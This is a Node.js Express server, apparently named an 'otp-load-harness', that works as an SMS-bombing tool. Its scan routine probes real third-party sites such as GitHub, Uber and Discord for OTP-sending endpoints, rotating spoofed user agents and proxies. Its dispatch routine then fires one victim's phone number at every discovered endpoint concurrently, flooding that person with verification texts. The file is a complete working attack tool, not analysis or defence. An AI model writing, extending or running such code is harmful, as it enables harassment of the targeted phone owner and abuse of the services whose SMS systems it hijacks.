const express = require("express");
const cors = require("cors");
const axios = require("axios");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(cors());
app.use(express.json({ limit: "1mb" }));
app.use(express.static(__dirname));

const ENDPOINTS_FILE = process.env.ENDPOINTS_FILE || path.join(__dirname, "endpoints.json");
const RPS = parseInt(process.env.RPS || "10", 10);
const PROXIES = (process.env.PROXIES || "")
  .split(",")
  .map((p) => p.trim())
  .filter(Boolean);

const UA_POOL = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Mobile Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0 Safari/537.36",
];

const SCAN_PATHS = [
  "/api/auth/send-otp",
  "/api/auth/send-code",
  "/api/v1/auth/send-otp",
  "/api/v1/otp/send",
  "/api/v1/verify/start",
  "/api/otp/send",
  "/api/send-code",
  "/api/send-otp",
  "/api/user/send-code",
  "/api/account/verify",
  "/api/verify",
  "/auth/send-otp",
  "/auth/otp",
  "/user/send_code",
  "/user/send-code",
  "/user/verify",
  "/account/send-code",
  "/verify/send",
  "/send-code",
  "/send-otp",
  "/otp/send",
  "/sms/send",
  "/sms/otp",
  "/phone/verify",
  "/phone/send-code",
  "/mobile/verify",
  "/mobile/send-code",
];

const FIELD_NAMES = ["phone", "mobile", "number", "msisdn", "phone_number", "mobile_number"];

function randUA() {
  return UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
}
function randProxy() {
  if (!PROXIES.length) return null;
  const p = PROXIES[Math.floor(Math.random() * PROXIES.length)];
  return { http: p, https: p };
}
function loadEndpoints() {
  try {
    return JSON.parse(fs.readFileSync(ENDPOINTS_FILE, "utf8"));
  } catch {
    return [];
  }
}
function saveEndpoints(list) {
  try {
    fs.writeFileSync(ENDPOINTS_FILE, JSON.stringify(list, null, 2));
  } catch (e) {
    console.error("save failed:", e.message);
  }
}

const scanClients = new Set();
const dispatchClients = new Set();

function sseBroadcast(set, payload) {
  const line = `data: ${JSON.stringify(payload)}\n\n`;
  for (const res of set) {
    try { res.write(line); } catch {}
  }
}
function sseHeaders(res) {
  res.set({
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache, no-transform",
    Connection: "keep-alive",
    "X-Accel-Buffering": "no",
  });
  res.flushHeaders();
}

let scanAbort = false;

function looksLikeHit(status, body) {
  if (!body) return false;
  const b = String(body).toLowerCase();
  if ([200, 201, 202].includes(status) &&
      ["sent", "success", "code", "otp", "verification", "check your phone", "message"].some((k) => b.includes(k)))
    return true;
  if ([400, 422].includes(status) &&
      ["phone", "mobile", "number", "invalid", "required"].some((k) => b.includes(k)))
    return true;
  if ([401, 403].includes(status) &&
      ["otp", "verify", "code", "auth"].some((k) => b.includes(k)))
    return true;
  return false;
}

async function probe(domain, pathPart, field) {
  const clean = domain.replace(/^https?:\/\//, "").replace(/\/$/, "");
  const url = `https://${clean}${pathPart}`;
  const baseHeaders = { "User-Agent": randUA(), Accept: "application/json" };
  const proxy = randProxy();

  const attempts = [
    { headers: { ...baseHeaders, "Content-Type": "application/json" }, data: { [field]: "+10000000000" } },
    { headers: { ...baseHeaders, "Content-Type": "application/x-www-form-urlencoded" },
      data: new URLSearchParams({ [field]: "+10000000000" }).toString() },
  ];

  for (const a of attempts) {
    try {
      const r = await axios({
        method: "POST",
        url,
        headers: a.headers,
        data: a.data,
        timeout: 6000,
        proxy,
        validateStatus: () => true,
        maxRedirects: 0,
      });
      const body = typeof r.data === "string" ? r.data : JSON.stringify(r.data);
      if (looksLikeHit(r.status, body)) {
        return {
          name: clean,
          url,
          method: "POST",
          field,
          extra: {},
          headers: a.headers,
          status: r.status,
        };
      }
    } catch {}
  }
  return null;
}

app.get("/api/scan/stream", (req, res) => {
  sseHeaders(res);
  scanClients.add(res);
  req.on("close", () => scanClients.delete(res));
});

app.post("/api/scan", async (req, res) => {
  const { targets = [], auto = false } = req.body || {};
  let domains = Array.isArray(targets) ? targets.map((d) => d.trim()).filter(Boolean) : [];

  if (auto && domains.length === 0) {
    domains = [
      "github.com", "gitlab.com", "reddit.com", "medium.com", "quora.com",
      "shopify.com", "etsy.com", "airbnb.com", "booking.com", "uber.com",
      "lyft.com", "doordash.com", "instacart.com", "postmates.com", "grubhub.com",
      "discord.com", "slack.com", "notion.so", "trello.com", "asana.com",
      "dropbox.com", "box.com", "zoom.us", "twitch.tv", "soundcloud.com",
    ];
  }
  if (!domains.length) return res.status(400).json({ error: "no targets" });

  scanAbort = false;
  res.json({ started: true, count: domains.length });

  const found = [];
  const CONC = 15;
  let idx = 0;

  async function worker() {
    while (idx < domains.length && !scanAbort) {
      const domain = domains[idx++];
      for (const p of SCAN_PATHS) {
        if (scanAbort) break;
        const field = FIELD_NAMES[Math.floor(Math.random() * FIELD_NAMES.length)];
        const hit = await probe(domain, p, field);
        if (hit) {
          found.push(hit);
          sseBroadcast(scanClients, {
            ts: new Date().toISOString(),
            domain,
            path: p,
            status: hit.status,
            ok: true,
            url: hit.url,
          });
          break;
        } else {
          sseBroadcast(scanClients, {
            ts: new Date().toISOString(),
            domain,
            path: p,
            status: 0,
            ok: false,
          });
        }
      }
    }
  }

  const workers = Array.from({ length: CONC }, () => worker());
  await Promise.all(workers);

  const existing = loadEndpoints();
  const merged = [...existing];
  for (const f of found) {
    if (!merged.some((e) => e.url === f.url)) merged.push(f);
  }
  saveEndpoints(merged);

  sseBroadcast(scanClients, {
    ts: new Date().toISOString(),
    done: true,
    found: found.length,
    total: merged.length,
  });
});

app.get("/api/scan/stop", (req, res) => {
  scanAbort = true;
  res.json({ stopped: true });
});

let dispatchAbort = false;
let stats = { sent: 0, success: 0, fail: 0 };

app.get("/api/dispatch/stream", (req, res) => {
  sseHeaders(res);
  dispatchClients.add(res);
  req.on("close", () => dispatchClients.delete(res));
});

app.get("/api/stats", (req, res) => res.json({ ...stats, endpoints: loadEndpoints().length }));

app.post("/api/dispatch", async (req, res) => {
  const { country_code = "+1", recipient = "" } = req.body || {};
  const number = (country_code + recipient).replace(/\s+/g, "");
  if (!number || number.length < 6) return res.status(400).json({ error: "bad number" });

  const endpoints = loadEndpoints();
  if (!endpoints.length) return res.status(400).json({ error: "no endpoints loaded" });

  dispatchAbort = false;
  stats = { sent: 0, success: 0, fail: 0 };
  res.json({ started: true, endpoints: endpoints.length });

  const CONC = 20;
  const delay = Math.max(0, Math.floor(1000 / RPS));
  let idx = 0;

  async function worker() {
    while (idx < endpoints.length && !dispatchAbort) {
      const ep = endpoints[idx++];
      const proxy = randProxy();
      const field = ep.field || "phone";
      const ct = (ep.headers && ep.headers["Content-Type"]) || "application/json";
      let data;
      if (ct.includes("json")) {
        data = JSON.stringify({ [field]: number, ...(ep.extra || {}) });
      } else {
        data = new URLSearchParams({ [field]: number, ...(ep.extra || {}) }).toString();
      }
      const headers = { ...(ep.headers || {}), "Content-Type": ct, "User-Agent": randUA() };

      let ok = false;
      let status = 0;
      try {
        const r = await axios({
          method: ep.method || "POST",
          url: ep.url,
          headers,
          data,
          timeout: 7000,
          proxy,
          validateStatus: () => true,
          maxRedirects: 0,
        });
        status = r.status;
        ok = [200, 201, 202, 204].includes(r.status);
      } catch (e) {
        status = e.response ? e.response.status : 0;
      }

      stats.sent++;
      if (ok) stats.success++;
      else stats.fail++;

      sseBroadcast(dispatchClients, {
        ts: new Date().toISOString(),
        name: ep.name || ep.url,
        status,
        ok,
        stats: { ...stats },
      });

      if (delay) await new Promise((r) => setTimeout(r, delay));
    }
  }

  const workers = Array.from({ length: CONC }, () => worker());
  await Promise.all(workers);
  sseBroadcast(dispatchClients, { done: true, stats: { ...stats } });
});

app.get("/api/dispatch/stop", (req, res) => {
  dispatchAbort = true;
  res.json({ stopped: true });
});

app.get("/healthz", (req, res) => res.send("ok"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`otp-load-harness running on port ${PORT}`);
  console.log(`endpoints loaded: ${loadEndpoints().length}`);
});